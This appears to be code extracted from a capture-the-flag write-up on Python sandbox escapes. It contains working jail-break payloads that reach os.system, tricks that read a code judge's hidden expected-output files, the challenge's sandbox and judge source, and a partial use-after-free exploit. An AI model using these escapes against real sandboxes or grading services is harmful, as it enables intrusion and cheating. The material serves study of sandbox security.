<span class="token string">""</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__base__<span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">141</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">"__builtins__"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"__import__"</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">"os"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">"cat /flag-*.txt"</span><span class="token punctuation">)</span>

<span class="token comment"># @maple3142 - overwrite dunder to call breakpoint</span>
<span class="token punctuation">[</span>c<span class="token operator">:=</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span>b<span class="token operator">:=</span>c<span class="token punctuation">.</span>copy<span class="token punctuation">.</span>__builtins__<span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token operator">-</span>c<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">for</span> c<span class="token punctuation">.</span>items <span class="token keyword">in</span><span class="token punctuation">[</span>b<span class="token punctuation">[</span><span class="token string">'breakpoint'</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span>

<span class="token comment"># @keymoon - retrieve help from &lt;class 'enum._EnumDict'></span>
<span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">.</span>update<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'bltns'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token builtin">help</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token comment"># and then similar to the above: pdb, jail -> pdb.set_trace() -> os.system</span>

<span class="token comment"># @SuperFashi / @ierae - retrieve help from &lt;class '_sitebuiltins._Helper'></span>
<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__base__<span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">158</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token comment"># and then similar to the above: pdb, jail -> pdb.set_trace() -> os.system</span></code>`,Qc,Ms,Np,mi,sl,Bs,vo,Eo,bi,nl,Ss,c2=`<code class="language-py">builtins_whitelist <span class="token operator">=</span> <span class="token builtin">set</span><span class="token punctuation">(</span>
    <span class="token punctuation">(</span>
        <span class="token string">"RuntimeError"</span><span class="token punctuation">,</span>
        <span class="token string">"Exception"</span><span class="token punctuation">,</span>
        <span class="token string">"KeyboardInterrupt"</span><span class="token punctuation">,</span>
        <span class="token string">"False"</span><span class="token punctuation">,</span>
        <span class="token string">"None"</span><span class="token punctuation">,</span>
        <span class="token string">"True"</span><span class="token punctuation">,</span>
        <span class="token string">"bytearray"</span><span class="token punctuation">,</span>
        <span class="token string">"bytes"</span><span class="token punctuation">,</span>
        <span class="token string">"dict"</span><span class="token punctuation">,</span>
        <span class="token string">"float"</span><span class="token punctuation">,</span>
        <span class="token string">"int"</span><span class="token punctuation">,</span>
        <span class="token string">"list"</span><span class="token punctuation">,</span>
        <span class="token string">"object"</span><span class="token punctuation">,</span>
        <span class="token string">"set"</span><span class="token punctuation">,</span>
        <span class="token string">"str"</span><span class="token punctuation">,</span>
        <span class="token string">"tuple"</span><span class="token punctuation">,</span>
        <span class="token string">"abs"</span><span class="token punctuation">,</span>
        <span class="token string">"all"</span><span class="token punctuation">,</span>
        <span class="token string">"any"</span><span class="token punctuation">,</span>
        <span class="token string">"apply"</span><span class="token punctuation">,</span>
        <span class="token string">"bin"</span><span class="token punctuation">,</span>
        <span class="token string">"bool"</span><span class="token punctuation">,</span>
        <span class="token string">"buffer"</span><span class="token punctuation">,</span>
        <span class="token string">"callable"</span><span class="token punctuation">,</span>
        <span class="token string">"chr"</span><span class="token punctuation">,</span>
        <span class="token string">"classmethod"</span><span class="token punctuation">,</span>
        <span class="token string">"cmp"</span><span class="token punctuation">,</span>
        <span class="token string">"coerce"</span><span class="token punctuation">,</span>
        <span class="token string">"compile"</span><span class="token punctuation">,</span>
        <span class="token string">"delattr"</span><span class="token punctuation">,</span>
        <span class="token string">"dir"</span><span class="token punctuation">,</span>
        <span class="token string">"divmod"</span><span class="token punctuation">,</span>
        <span class="token string">"enumerate"</span><span class="token punctuation">,</span>
        <span class="token string">"filter"</span><span class="token punctuation">,</span>
        <span class="token string">"format"</span><span class="token punctuation">,</span>
        <span class="token string">"hasattr"</span><span class="token punctuation">,</span>
        <span class="token string">"hash"</span><span class="token punctuation">,</span>
        <span class="token string">"hex"</span><span class="token punctuation">,</span>
        <span class="token string">"id"</span><span class="token punctuation">,</span>
        <span class="token string">"input"</span><span class="token punctuation">,</span>
        <span class="token string">"isinstance"</span><span class="token punctuation">,</span>
        <span class="token string">"issubclass"</span><span class="token punctuation">,</span>
        <span class="token string">"iter"</span><span class="token punctuation">,</span>
        <span class="token string">"len"</span><span class="token punctuation">,</span>
        <span class="token string">"map"</span><span class="token punctuation">,</span>
        <span class="token string">"max"</span><span class="token punctuation">,</span>
        <span class="token string">"min"</span><span class="token punctuation">,</span>
        <span class="token string">"next"</span><span class="token punctuation">,</span>
        <span class="token string">"oct"</span><span class="token punctuation">,</span>
        <span class="token string">"open"</span><span class="token punctuation">,</span>
        <span class="token string">"ord"</span><span class="token punctuation">,</span>
        <span class="token string">"pow"</span><span class="token punctuation">,</span>
        <span class="token string">"print"</span><span class="token punctuation">,</span>
        <span class="token string">"property"</span><span class="token punctuation">,</span>
        <span class="token string">"range"</span><span class="token punctuation">,</span>
        <span class="token string">"reduce"</span><span class="token punctuation">,</span>
        <span class="token string">"repr"</span><span class="token punctuation">,</span>
        <span class="token string">"reversed"</span><span class="token punctuation">,</span>
        <span class="token string">"round"</span><span class="token punctuation">,</span>
        <span class="token string">"setattr"</span><span class="token punctuation">,</span>
        <span class="token string">"slice"</span><span class="token punctuation">,</span>
        <span class="token string">"sorted"</span><span class="token punctuation">,</span>
        <span class="token string">"staticmethod"</span><span class="token punctuation">,</span>
        <span class="token string">"sum"</span><span class="token punctuation">,</span>
        <span class="token string">"super"</span><span class="token punctuation">,</span>
        <span class="token string">"unichr"</span><span class="token punctuation">,</span>
        <span class="token string">"xrange"</span><span class="token punctuation">,</span>
        <span class="token string">"zip"</span><span class="token punctuation">,</span>
        <span class="token string">"len"</span><span class="token punctuation">,</span>
        <span class="token string">"sort"</span><span class="token punctuation">,</span>
    <span class="token punctuation">)</span>
<span class="token punctuation">)</span>

<span class="token keyword">class</span> <span class="token class-name">ReadOnlyBuiltins</span><span class="token punctuation">(</span><span class="token builtin">dict</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">def</span> <span class="token function">clear</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">raise</span> RuntimeError<span class="token punctuation">(</span><span class="token string">"Nein"</span><span class="token punctuation">)</span>
    <span class="token keyword">def</span> <span class="token function">__delitem__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> key<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">raise</span> RuntimeError<span class="token punctuation">(</span><span class="token string">"Nein"</span><span class="token punctuation">)</span>
    <span class="token keyword">def</span> <span class="token function">pop</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> key<span class="token punctuation">,</span> default<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">raise</span> RuntimeError<span class="token punctuation">(</span><span class="token string">"Nein"</span><span class="token punctuation">)</span>
    <span class="token keyword">def</span> <span class="token function">popitem</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">raise</span> RuntimeError<span class="token punctuation">(</span><span class="token string">"Nein"</span><span class="token punctuation">)</span>
    <span class="token keyword">def</span> <span class="token function">setdefault</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> key<span class="token punctuation">,</span> value<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">raise</span> RuntimeError<span class="token punctuation">(</span><span class="token string">"Nein"</span><span class="token punctuation">)</span>
    <span class="token keyword">def</span> <span class="token function">__setitem__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> key<span class="token punctuation">,</span> value<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">raise</span> RuntimeError<span class="token punctuation">(</span><span class="token string">"Nein"</span><span class="token punctuation">)</span>
    <span class="token keyword">def</span> <span class="token function">update</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> <span class="token builtin">dict</span><span class="token punctuation">,</span> <span class="token operator">**</span>kw<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">raise</span> RuntimeError<span class="token punctuation">(</span><span class="token string">"Nein"</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">_safe_open</span><span class="token punctuation">(</span><span class="token builtin">open</span><span class="token punctuation">,</span> submission_id<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">def</span> <span class="token function">safe_open</span><span class="token punctuation">(</span><span class="token builtin">file</span><span class="token punctuation">,</span> mode<span class="token operator">=</span><span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span> mode <span class="token operator">!=</span> <span class="token string">"r"</span><span class="token punctuation">:</span>
            <span class="token keyword">raise</span> RuntimeError<span class="token punctuation">(</span><span class="token string">"Nein"</span><span class="token punctuation">)</span>
        <span class="token builtin">file</span> <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">file</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> <span class="token builtin">file</span><span class="token punctuation">.</span>endswith<span class="token punctuation">(</span>submission_id <span class="token operator">+</span> <span class="token string">".expected"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">raise</span> RuntimeError<span class="token punctuation">(</span><span class="token string">"Nein"</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token builtin">file</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> safe_open

<span class="token keyword">class</span> <span class="token class-name">Sandbox</span><span class="token punctuation">(</span><span class="token builtin">object</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> submission_id<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">import</span> sys
        <span class="token keyword">from</span> ctypes <span class="token keyword">import</span> pythonapi<span class="token punctuation">,</span> POINTER<span class="token punctuation">,</span> py_object

        _get_dict <span class="token operator">=</span> pythonapi<span class="token punctuation">.</span>_PyObject_GetDictPtr
        _get_dict<span class="token punctuation">.</span>restype <span class="token operator">=</span> POINTER<span class="token punctuation">(</span>py_object<span class="token punctuation">)</span>
        _get_dict<span class="token punctuation">.</span>argtypes <span class="token operator">=</span> <span class="token punctuation">[</span>py_object<span class="token punctuation">]</span>
        <span class="token keyword">del</span> pythonapi<span class="token punctuation">,</span> POINTER<span class="token punctuation">,</span> py_object

        <span class="token keyword">def</span> <span class="token function">dictionary_of</span><span class="token punctuation">(</span>ob<span class="token punctuation">)</span><span class="token punctuation">:</span>
            dptr <span class="token operator">=</span> _get_dict<span class="token punctuation">(</span>ob<span class="token punctuation">)</span>
            <span class="token keyword">return</span> dptr<span class="token punctuation">.</span>contents<span class="token punctuation">.</span>value
        type_dict <span class="token operator">=</span> dictionary_of<span class="token punctuation">(</span><span class="token builtin">type</span><span class="token punctuation">)</span>
        <span class="token keyword">del</span> type_dict<span class="token punctuation">[</span><span class="token string">"__bases__"</span><span class="token punctuation">]</span>
        <span class="token keyword">del</span> type_dict<span class="token punctuation">[</span><span class="token string">"__subclasses__"</span><span class="token punctuation">]</span>
        original_builtins <span class="token operator">=</span> sys<span class="token punctuation">.</span>modules<span class="token punctuation">[</span><span class="token string">"__main__"</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__dict__<span class="token punctuation">[</span><span class="token string">"__builtins__"</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__dict__
        original_builtins<span class="token punctuation">[</span><span class="token string">"open"</span><span class="token punctuation">]</span> <span class="token operator">=</span> _safe_open<span class="token punctuation">(</span><span class="token builtin">open</span><span class="token punctuation">,</span> submission_id<span class="token punctuation">)</span>
        <span class="token keyword">for</span> builtin <span class="token keyword">in</span> <span class="token builtin">list</span><span class="token punctuation">(</span>original_builtins<span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">if</span> builtin <span class="token keyword">not</span> <span class="token keyword">in</span> builtins_whitelist<span class="token punctuation">:</span>
                <span class="token keyword">del</span> sys<span class="token punctuation">.</span>modules<span class="token punctuation">[</span><span class="token string">"__main__"</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__dict__<span class="token punctuation">[</span><span class="token string">"__builtins__"</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__dict__<span class="token punctuation">[</span>builtin<span class="token punctuation">]</span>
        safe_builtins <span class="token operator">=</span> ReadOnlyBuiltins<span class="token punctuation">(</span>original_builtins<span class="token punctuation">)</span>
        sys<span class="token punctuation">.</span>modules<span class="token punctuation">[</span><span class="token string">"__main__"</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__dict__<span class="token punctuation">[</span><span class="token string">"__builtins__"</span><span class="token punctuation">]</span> <span class="token operator">=</span> safe_builtins
        <span class="token keyword">if</span> <span class="token builtin">hasattr</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>modules<span class="token punctuation">[</span><span class="token string">"__main__"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">"__file__"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">del</span> sys<span class="token punctuation">.</span>modules<span class="token punctuation">[</span><span class="token string">"__main__"</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__file__
        <span class="token keyword">if</span> <span class="token builtin">hasattr</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>modules<span class="token punctuation">[</span><span class="token string">"__main__"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">"__loader__"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">del</span> sys<span class="token punctuation">.</span>modules<span class="token punctuation">[</span><span class="token string">"__main__"</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__loader__
        <span class="token keyword">for</span> key <span class="token keyword">in</span> <span class="token punctuation">[</span>
            <span class="token string">"__loader__"</span><span class="token punctuation">,</span>
            <span class="token string">"__spec__"</span><span class="token punctuation">,</span>
            <span class="token string">"origin"</span><span class="token punctuation">,</span>
            <span class="token string">"__file__"</span><span class="token punctuation">,</span>
            <span class="token string">"__cached__"</span><span class="token punctuation">,</span>
            <span class="token string">"ReadOnlyBuiltins"</span><span class="token punctuation">,</span>
            <span class="token string">"Sandbox"</span><span class="token punctuation">,</span>
        <span class="token punctuation">]</span><span class="token punctuation">:</span>
            <span class="token keyword">if</span> key <span class="token keyword">in</span> sys<span class="token punctuation">.</span>modules<span class="token punctuation">[</span><span class="token string">"__main__"</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__dict__<span class="token punctuation">[</span><span class="token string">"__builtins__"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"open"</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__globals__<span class="token punctuation">:</span>
                <span class="token keyword">del</span> sys<span class="token punctuation">.</span>modules<span class="token punctuation">[</span><span class="token string">"__main__"</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__dict__<span class="token punctuation">[</span><span class="token string">"__builtins__"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"open"</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span>key<span class="token punctuation">]</span></code>`,al,qs,ho,xo,yi,pl,zs,l2=`<code class="language-py"><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/submit/&lt;problem_id>'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token decorator annotation punctuation">@login_required</span>
<span class="token keyword">def</span> <span class="token function">submit</span><span class="token punctuation">(</span>problem_id<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
    code <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">'code'</span><span class="token punctuation">]</span>
    <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>code<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">32768</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> abort<span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">)</span>
    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
    <span class="token comment"># Prepare code</span>
    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'/tmp/</span><span class="token interpolation"><span class="token punctuation">&#123;</span>submission_id<span class="token punctuation">&#125;</span></span><span class="token string">.py'</span></span><span class="token punctuation">,</span> <span class="token string">'w'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
        f<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'__import__("sandbox").Sandbox("</span><span class="token interpolation"><span class="token punctuation">&#123;</span>submission_id<span class="token punctuation">&#125;</span></span><span class="token string">")&#92;n'</span></span> <span class="token operator">+</span> code<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'&#92;r&#92;n'</span><span class="token punctuation">,</span> <span class="token string">'&#92;n'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
    <span class="token comment"># Set up input and output files</span>
    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'/tmp/</span><span class="token interpolation"><span class="token punctuation">&#123;</span>submission_id<span class="token punctuation">&#125;</span></span><span class="token string">.in'</span></span><span class="token punctuation">,</span> <span class="token string">'w'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
        f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>testcase<span class="token punctuation">.</span><span class="token builtin">input</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'&#92;r&#92;n'</span><span class="token punctuation">,</span> <span class="token string">'&#92;n'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'/tmp/</span><span class="token interpolation"><span class="token punctuation">&#123;</span>submission_id<span class="token punctuation">&#125;</span></span><span class="token string">.expected'</span></span><span class="token punctuation">,</span> <span class="token string">'w'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
        f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>testcase<span class="token punctuation">.</span>output<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'&#92;r&#92;n'</span><span class="token punctuation">,</span> <span class="token string">'&#92;n'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

    <span class="token comment"># Run code</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
       proc <span class="token operator">=</span> subprocess<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'sudo -u nobody -g nogroup python3 /tmp/</span><span class="token interpolation"><span class="token punctuation">&#123;</span>submission_id<span class="token punctuation">&#125;</span></span><span class="token string">.py &lt; /tmp/</span><span class="token interpolation"><span class="token punctuation">&#123;</span>submission_id<span class="token punctuation">&#125;</span></span><span class="token string">.in > /tmp/</span><span class="token interpolation"><span class="token punctuation">&#123;</span>submission_id<span class="token punctuation">&#125;</span></span><span class="token string">.out'</span></span><span class="token punctuation">,</span> shell<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> proc<span class="token punctuation">.</span>returncode <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">:</span>
        submission<span class="token punctuation">.</span>status <span class="token operator">=</span> <span class="token string">'Runtime Error'</span>
        skip_remaining_cases <span class="token operator">=</span> <span class="token boolean">True</span>
        submission_case<span class="token punctuation">.</span>status <span class="token operator">=</span> <span class="token string">'Runtime Error'</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        diff <span class="token operator">=</span> subprocess<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'diff /tmp/</span><span class="token interpolation"><span class="token punctuation">&#123;</span>submission_id<span class="token punctuation">&#125;</span></span><span class="token string">.out /tmp/</span><span class="token interpolation"><span class="token punctuation">&#123;</span>submission_id<span class="token punctuation">&#125;</span></span><span class="token string">.expected'</span></span><span class="token punctuation">,</span> shell<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> capture_output<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> diff<span class="token punctuation">.</span>stdout<span class="token punctuation">:</span>
            submission<span class="token punctuation">.</span>status <span class="token operator">=</span> <span class="token string">'Wrong Answer'</span>
            skip_remaining_cases <span class="token operator">=</span> <span class="token boolean">True</span>
            submission_case<span class="token punctuation">.</span>status <span class="token operator">=</span> <span class="token string">'Wrong Answer'</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            submission_case<span class="token punctuation">.</span>status <span class="token operator">=</span> <span class="token string">'Accepted'</span>
    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span></code>`,tl,Ws,Co,Lo,gi,ol,Ys,u2=`<code class="language-py"><span class="token comment"># @Starlight - retrieve open from closure</span>
<span class="token builtin">open</span> <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">.</span>__closure__<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cell_contents
io <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">.</span>__self__
io<span class="token punctuation">.</span>__spec__<span class="token punctuation">.</span>name <span class="token operator">=</span> <span class="token string">'sys'</span>
sys <span class="token operator">=</span> io<span class="token punctuation">.</span>__loader__<span class="token punctuation">.</span>create_module<span class="token punctuation">(</span>io<span class="token punctuation">.</span>__spec__<span class="token punctuation">)</span>
a <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token keyword">if</span> <span class="token string">' '</span> <span class="token keyword">not</span> <span class="token keyword">in</span> a<span class="token punctuation">:</span>
    sys<span class="token punctuation">.</span>modules<span class="token punctuation">[</span><span class="token string">'os'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">'cat /tmp/*.expected > /tmp/flag'</span><span class="token punctuation">)</span>
<span class="token keyword">else</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>a <span class="token operator">+</span> sys<span class="token punctuation">.</span>modules<span class="token punctuation">[</span><span class="token string">'os'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string">'cat /tmp/flag'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token comment"># @realansgar - retrieve FileIO / open from io wrapper</span>
a <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"/etc/passwd"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token builtin">buffer</span><span class="token punctuation">.</span>raw<span class="token punctuation">.</span>__class__<span class="token punctuation">(</span><span class="token string">"/tmp/*.expected"</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> sys<span class="token punctuation">.</span>modules<span class="token punctuation">[</span><span class="token string">'os'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string">'cat /tmp/flag'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">if</span> <span class="token string">"idek"</span> <span class="token keyword">in</span> a<span class="token punctuation">:</span>
    <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"/etc/passwd"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token builtin">buffer</span><span class="token punctuation">.</span>raw<span class="token punctuation">.</span>__class__<span class="token punctuation">(</span><span class="token string">"/tmp/flag"</span><span class="token punctuation">,</span> <span class="token string">"w"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>write<span class="token punctuation">(</span>a<span class="token punctuation">)</span>

<span class="token comment"># @salvatore.abello - UAF :brain:</span>
<span class="token keyword">def</span> <span class="token function">__index__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">global</span> memory
    uaf<span class="token punctuation">.</span>clear<span class="token punctuation">(</span><span class="token punctuation">)</span>
    memory <span class="token operator">=</span> <span class="token builtin">bytearray</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    uaf<span class="token punctuation">.</span>extend<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token number">56</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> <span class="token number">1</span>
UAF <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__class__<span class="token punctuation">(</span><span class="token string">'UAF'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>
    <span class="token string">'__index__'</span><span class="token punctuation">:</span> __index__
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
uaf <span class="token operator">=</span> <span class="token builtin">bytearray</span><span class="token punctuation">(</span><span class="token number">56</span><span class="token punctuation">)</span>
uaf<span class="token punctuation">[</span><span class="token number">23</span><span class="token punctuation">]</span> <span class="token operator">=</span> UAF<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">id</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">p64</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">(</span>value <span class="token operator">>></span> <span class="token punctuation">(</span>i <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
wow <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__class__<span class="token punctuation">(</span><span class="token string">"wow"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>wow<span class="token punctuation">)</span>
system_addr <span class="token operator">=</span> <span class="token builtin">id</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x653b58</span>
sys <span class="token operator">=</span> p64<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span>
command <span class="token operator">=</span> <span class="token string">b"js"</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">b"\0"</span><span class="token punctuation">)</span>
